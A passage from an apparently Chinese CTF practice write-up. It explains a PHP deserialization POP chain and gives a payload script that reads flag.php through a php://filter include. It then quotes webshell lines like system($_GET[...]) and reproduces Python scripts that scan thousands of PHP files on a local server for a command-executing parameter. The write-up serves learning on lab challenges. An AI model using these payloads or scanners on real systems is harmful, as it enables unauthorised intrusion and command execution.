class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>想要获得 flag 需要用 Modifier 类中的 include 文件包含读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>触发 <code>append()</code>  就需要用 <code>__invoke()</code>  触发，触发 <code>invoke()</code>  就需要把 Modifier 类被当作函数调用， <code>__invoke(当尝试以调用函数的方式调用一个对象时，方法会被自动调用)</code> ，现在得到可以知道 <code>__invoke()-&gt;append-&gt;文件包含</code> 的部分 pop 链</p><p>本题的参数是 pop，当 pop 参数为 Show 类的时候，反序列化时会先调用 <code>__wakeup()</code>  过滤，这时候 pop 包含两个参数，分别是 <code>source</code>  和 <code>str</code> ，因为该类中函数 <code>__construct()</code>  有 <code>echo $this-&gt;source</code> ，此时如果 source 数是 new 一个类的话（就是作为一个类的对象），就会调用 <code>__toString()</code>  函数，那就可以把 source 参数 <code>new Show()</code> ，这时候 <code>__toString()</code>  被调用，其中 <code>$this-&gt;str-&gt;source</code> ，就是 Show 类中 source 参数的 str 参数的 source 参数，如果将 str 参数 <code>new Test()</code> ，因为 Test 类中不具有 source 参数，执行 <code>__toString()</code>  函数则会找不到 source 参数，就会调用 <code>__get()</code>  函数，而 <code>__get()</code>  函数中 function 为调用的 p 参数，如果 $function 是个对象，那么则会调用__invoke () 函数，此时如果将 p 参数设置为 Modifier 类，就会执行文件包含输出内容为参数 var，所以在写 payload 的时候修改 var 参数，再进行序列化就可以读出 flag 了，但是直接包含是得不到 flag 的，需要利用 php 伪协议 filter 来读取 <code>flag.php</code> ，最后 base64 解码就可以得到 flag。所以最后的 pop 链为：</p><p><code>__construct-&gt;__toString()-&gt;__get()-&gt;__invoke()-&gt;append-&gt;文件包含</code></p><p>构造 payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> <span class="title class_">Modifier</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload 中可以删去源码一些在编写脚本时多余的代码，让 payload 更简洁，但我就没有去删了，感觉这样效率更高。</p><p>需要 urlencode 的原因是因为如果不进行编码，最后输出的结果是片段的，不是全部的，会有类似截断导致结果异常，在一些不是 public 定义的变量，反序列化会有一些乱码，直接 urlencode 就不用担心这类情况。</p><p>由 payload 得到 url 编码的序列化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKY2xhc3MgRmxhZ3sKICAgIHByaXZhdGUgJGZsYWc9ICJmbGFne2M5NmRkNmFhLTA1ZjYtNGUxNi04ZmQyLTFjZTczOGYxNjlkNH0iOwp9CmVjaG8gIkhlbHAgTWUgRmluZCBGTEFHISI7Cj8+</span><br></pre></td></tr></table></figure><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c04.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c04.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>得到的 base64 拿去解码</p><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c05.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c05.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p c96dd6aa-05f6-4e16-8fd2-1ce738f169d4>拿到 flag，flag</p><h2 id="强网杯-2019高明的黑客"><a class="markdownIt-Anchor" href="#强网杯-2019高明的黑客">#</a> [强网杯 2019] 高明的黑客</h2><p><img src="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c06.png" class="lazyload" data-srcset="/2024/01/27/buuctf%E5%88%B7%E9%A2%983/c06.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt></p><p>下载 <code>www.tar.gz</code> ，得到 3002 个 php 文件。。。</p><p>在这写 php 文件中有很多 <code>??</code>  符号，例如： <code>system($_GET['jVMcNhK_F'] ?? ' ');</code> ，查了一下，这里记录一下</p><p>在 PHP 中， <code>??</code>  符号是空合并运算符（Null Coalescing Operator）。它用于简化检查变量是否已设置并且不为 null 的过程。</p><p>通常，我们可能会使用三元运算符来检查一个变量是否已设置，并且不为 null，然后提供一个备用值，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="keyword">isset</span>(<span class="variable">$variable</span>) ? <span class="variable">$variable</span> : <span class="variable">$defaultValue</span>;</span><br></pre></td></tr></table></figure><p>使用空合并运算符，可以更简洁地完成相同的操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$result</span> = <span class="variable">$variable</span> ?? <span class="variable">$defaultValue</span>;</span><br></pre></td></tr></table></figure><p>这行代码的意思是，如果  <code>$variable</code>  已经设置并且不为 null，那么  <code>$result</code>  将被赋值为  <code>$variable</code>  的值。如果  <code>$variable</code>  是未设置或者为 null，那么  <code>$result</code>  将被赋值为  <code>$defaultValue</code> 。</p><p>在这些代码中，有很多类似一下的代码片段：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;jVMcNhK_F&#x27;</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jVMcNhK_F&#x27;</span>] ?? <span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;tz2aE_IWb&#x27;</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> `&#123;<span class="variable">$_GET</span>[<span class="string">&#x27;tz2aE_IWb&#x27;</span>]&#125;`;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;cXjHClMPs&#x27;</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> `&#123;<span class="variable">$_GET</span>[<span class="string">&#x27;cXjHClMPs&#x27;</span>]&#125;`;</span><br></pre></td></tr></table></figure><p>其中 system 和 echo 以及 eval 这三个函数都可以返回值，exec 函数是不回显的，到这一步就还是不知道该怎么做，查看别的师傅的 wp 的时候看到一句话<strong>每个 php 文件都有若干个一句话木马</strong>，才突然觉得，确实这些代码很想平时写的一句话木马。写脚本测试哪一个 shell 可以连接的吗？</p><p>对于利用 python 写脚本还是比较陌生，用别的师傅的 wp 来学习，这里贴一下学习链接：<a href="https://blog.csdn.net/RABCDXB/article/details/115256974">https://blog.csdn.net/RABCDXB/article/details/115256974</a></p><p><strong>简单的 exp（这不是题解，只是学习用的）：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">files = os.listdir(<span class="string">&#x27;D:/phpstudy/www/test/&#x27;</span>)    <span class="comment">#获取路径下的所有文件</span></span><br><span class="line">reg = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(?&lt;=_GET\[\&#x27;).*(?=\&#x27;\])&#x27;</span>)    <span class="comment">#设置正则表达式，正则表达式的解释看原文</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:     <span class="comment">#从第一个文件开始</span></span><br><span class="line">    url = <span class="string">&quot;http://127.0.0.1/test/&quot;</span> + i</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;D:/phpstudy/www/test/&quot;</span> + i)   <span class="comment">#打开该文件</span></span><br><span class="line">    data = f.read()     <span class="comment">#读取</span></span><br><span class="line">    f.close()       <span class="comment">#关闭</span></span><br><span class="line">    result = reg.findall(data)  <span class="comment">#从文件中查找GET请求</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> result:        <span class="comment">#从第一个GET请求开始</span></span><br><span class="line">        payload = url + <span class="string">&quot;?&quot;</span> + j + <span class="string">&quot;=echo ******&quot;</span>    <span class="comment">#尝试请求多次路径，并执行命令</span></span><br><span class="line">        <span class="built_in">print</span>(payload)    <span class="comment">#返回每次payload</span></span><br><span class="line">        html = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span>  <span class="string">&quot;******&quot;</span> <span class="keyword">in</span> html.text:</span><br><span class="line">            <span class="built_in">print</span>(payload + <span class="string">&#x27; success&#x27;</span>)     <span class="comment">#返回成功的payload+success</span></span><br><span class="line">            exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>正则表达式 <code>r'(?&lt;=_GET\[\').*(?=\'\])'</code>  解释</p><p>这个正则表达式用于匹配形如  <code>_GET['some_key']</code>  的字符串，并提取  <code>some_key</code>  部分。让我解释一下每个部分：</p><ul><li><code>(?&lt;=_GET\[')</code> : 这是一个正则表达式的<strong>前瞻断言</strong>（lookbehind assertion），表示匹配的内容之前必须是  <code>_GET['</code> ，其中  <code>\['</code>  是转义字符，匹配字符  <code>[</code> 。</li><li><code>.*</code> : 这表示匹配任意数量的字符（包括 0 个字符），直到下一个部分匹配为止。</li><li><code>(?=\'\])</code> : 这是一个正则表达式的<strong>后瞻断言</strong>（lookahead assertion），表示匹配的内容之后必须是  <code>']</code> ，其中  <code>\'</code>  是转义字符，匹配字符  <code>'</code> 。</li></ul><p>综合起来，整个正则表达式的作用是匹配  <code>_GET['some_key']</code>  格式的字符串，并提取  <code>some_key</code>  部分。</p><p><strong>高配版 exp，贴个原文（<a href="https://blog.csdn.net/a3320315/article/details/102945940%EF%BC%89%EF%BC%9A">https://blog.csdn.net/a3320315/article/details/102945940）：</a></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：   &#x27;</span> + time.asctime(time.localtime(time.time())))  <span class="comment">#一个简单的时间函数，为了美观</span></span><br><span class="line">s1 = threading.Semaphore(<span class="number">100</span>)   <span class="comment">#设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;D:/phpstudy/WWW/hack/src/&quot;</span></span><br><span class="line">os.chdir(filePath)      <span class="comment">#改变当前工作目录到指定的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>   <span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)    <span class="comment">#得到该目录下所有文件名</span></span><br><span class="line">session = requests.Session()    <span class="comment">#先实例化一个对象，得到session()为之后的实现代码回显得取创造条件</span></span><br><span class="line">session.keep_alive = <span class="literal">False</span>  <span class="comment">#如果开启keep-alive，则服务端在返回response后不关闭TCP连接，设置连接活跃状态为False，是为了减少无效的连接？</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_content</span>(<span class="params">file</span>):</span><br><span class="line">    s1.acquire()    <span class="comment">#我的理解是锁住这些线程资源，具体看https://vimsky.com/examples/usage/python-lock-acquire-method-with-example-02.html</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;trying &#x27;</span> + file + <span class="string">&#x27; &#x27;</span> + time.asctime(time.localtime(time.time())))   <span class="comment">#美观，同时可以对比不加线程和加线程的时间对比</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f: <span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">        gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">        posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;</span><br><span class="line">    params = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://127.0.0.1/hack/src/&#x27;</span> + file</span><br><span class="line">    req = session.post(url, data=data, params=params)    <span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()     <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:     <span class="comment">#查找是否又可利用的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()     <span class="comment">#关闭请求，释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:        <span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;，利用的参数：%s&quot;</span> %param)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()    <span class="comment">#对应于之前的多线程打开，此方法释放线程先前获取的锁</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:     <span class="comment">#加入多线程</span></span><br><span class="line">    t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure><p><strong>记录解释 <code>'\$_POST\[\'(.*?)\'\]'</code> ：</strong></p><p>这个正则表达式用于匹配 PHP 中  <code>$_POST</code>  超全局数组中的键。下面是对正则表达式的解释：</p><ul><li><code>\$_POST</code> : 匹配  <code>$_POST</code>  字面字符串。由于  <code>$</code>  和  <code>.</code>  在正则表达式中具有特殊含义，所以需要使用  <code>\</code>  来转义它们，以确保匹配字面意义上的字符  <code>$</code>  和  <code>POST</code> 。</li><li><code>\[</code> : 匹配左方括号  <code>[</code> 。由于  <code>[</code>  也是正则表达式中的元字符，因此需要使用  <code>\</code>  转义。</li><li><code>\'</code> : 匹配单引号  <code>'</code>  字符。同样，由于单引号也是正则表达式中的特殊字符，因此需要使用  <code>\</code>  转义。</li><li><code>(.*?)</code> : 这是一个捕获组，用于捕获任意数量的任意字符，但是以非贪婪方式匹配，即尽可能少地匹配字符。 <code>.*?</code>  表示匹配任意字符零次或多次， <code>?</code>  表示非贪婪模式，即尽可能短地匹配。</li><li><code>\'</code> : 匹配单引号  <code>'</code>  字符。同样，由于单引号也是正则表达式中的特殊字符，因此需要使用  <code>\</code>  转义。</li><li><code>\]</code> : 匹配右方括号  <code>]</code> 。同样，由于  <code>]</code>  也是正则表达式中的元字符，因此需要使用  <code>\</code>  转义。</li></ul><p>综合起来，这个正则表达式用于匹配形如  <code>$_POST['键名']</code>  的字符串。</p><p><strong>记录解释 <code>threading.Thread(target=get_content, args=(i,))</code> 